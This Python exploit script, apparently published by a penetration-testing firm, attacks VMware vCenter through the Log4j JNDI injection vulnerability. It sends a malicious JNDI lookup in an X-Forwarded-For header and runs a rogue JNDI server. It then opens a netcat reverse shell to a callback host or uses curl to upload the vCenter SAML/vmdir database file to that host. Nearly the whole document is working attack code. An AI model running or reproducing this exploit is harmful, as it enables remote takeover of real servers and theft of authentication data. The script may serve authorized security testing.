import argparse
from urllib.parse import urlparse
import requests
import base64
import subprocess
import time
import os.path
from utils.httppost import serve 

# Dealing with SSL Warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

# Defining arguments
def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="ip", help="vCenter Host IP", action='store', required=True)
    parser.add_argument("-i", "--ip", dest="callback", help="Callback IP for payload delivery and reverse shell.", action='store', required=True)
    parser.add_argument("-p", "--port", dest="port", help="Callback port for reverse shell.", action='store', required=False)
    parser.add_argument("-e", "--exfiltrate", dest="exfiltrate", help="Module to pull SAML DB", action='store_true', required=False)
    parser.add_argument("-r", "--revshell", dest="shell", help="Module to establish reverse shell", action='store_true', required=False)

    args = parser.parse_args()

    # Making sure port specified for reverse shell payload
    if not args.port and args.shell == True:
        print('[!] You did not specify a port. Re-run command with -p flag.')
        exit()
    else:
        pass

    # Making sure RogueJNDI exists on disk
    if os.path.exists('./utils/rogue-jndi/target/RogueJndi-1.1.jar') == True:
        pass 
    else:
        print('[!] You have not compiled RogueJNDI.')
        print('[!] See README.md for more information.')
        exit()

    # Making sure a real module was specified by the user
    if args.exfiltrate == True:
        print('[*] Exfiltration of the SAML database starting now...')
    elif args.shell == True:
        print(f'[*] Make sure an listener is started: ncat -lvnp {args.port}')
        print('[*] Reverse shell exploit chain starting now...')
    else:
        print('[!] You did not specify a valid module!')
        exit()

       
    return args.ip, args.callback, args.port, args.exfiltrate, args.shell
        

def get_dns(ip):
    url = f'https://{ip}/ui/login'
    response = requests.get(url, allow_redirects=False, verify=False)
    location = urlparse(response.headers["Location"])
    path = location.path
    hostname = path.strip('/').split('/')[3]
    print(f'[*] Got hostname: {hostname}')
    return hostname

def revshell(callback, hostname, port, ip):

    # Building our URL
    url = f'https://{ip}/websso/SAML2/SSO/{hostname}?SAMLRequest='

    # Crafting reverse shell command. Thanks vMWare for including nc in your appliance!
    shell = base64.b64encode(f'nc -e /bin/sh {callback} {port}'.encode('utf-8'))
    revshell = shell.decode('utf-8')

    print('[*] Starting malicous JNDI Server')
    proc = subprocess.Popen(['timeout', '30s', 'java', '-jar', './utils/rogue-jndi/target/RogueJndi-1.1.jar', '--command', f'bash -c {{echo,{revshell}}}|{{base64,-d}}|{{bash,-i}}', '--hostname', f'{callback}'],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

    # Crafting our very simple payload and headers
    header = { 
        'X-Forwarded-For': f'${{jndi:ldap://{callback}:1389/o=tomcat}}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36'
    }

    # Sleeping for seven seconds to prevent issues
    time.sleep(7)

    # Issuing request
    print('[*] Firing payload!')
    response = requests.get(url, headers=header, verify=False)

    print('[*] Check for a callback!')

def exfil(callback, hostname, ip):

    # Building our URL
    url = f'https://{ip}/websso/SAML2/SSO/{hostname}?SAMLRequest='

    # Crafting cURL paylaod to upload SAML payload to our server
    payload = base64.b64encode(f'curl -F "file=@/storage/db/vmware-vmdir/data.mdb" http://{callback}:8090/'.encode('utf-8'))
    exfil = payload.decode('utf-8')

    print('[*] Starting malicous JNDI Server.')
    proc = subprocess.Popen(['timeout', '25s', 'java', '-jar', './utils/rogue-jndi/target/RogueJndi-1.1.jar', '--command', f'bash -c {{echo,{exfil}}}|{{base64,-d}}|{{bash,-i}}', '--hostname', f'{callback}'],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

    # Crafting our very simple payload and headers
    header = { 
        'X-Forwarded-For': f'${{jndi:ldap://{callback}:1389/o=tomcat}}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36'
    }

    # Sleeping for five seconds to prevent issues
    time.sleep(5)

    print('[*] Firing payload!')
    response = requests.get(url, headers=header, verify=False)

    print('[*] Serving web server to accept the uploaded file.')
    serve()


#print('''
#Description: Remote code execution and SAML database exfiltration using Log4j vulnerabilities.
#Company: Sprocket Security
#Website: https://www.sprocketsecurity.com
#Blog: https://www.sprocketsecurity.com/blog/how-to-exploit-log4j-vulnerabilities-in-vmware-vcenter
#''')

ip, callback, port, exfiltrate, shell = args()

# We are always going to need the vCenter hostname, so doing this first
hostname = get_dns(ip)

# Picking what we are going to do
if exfiltrate is True:
   exfil(callback, hostname, ip)

elif shell is True:
   revshell(callback, hostname, port, ip)
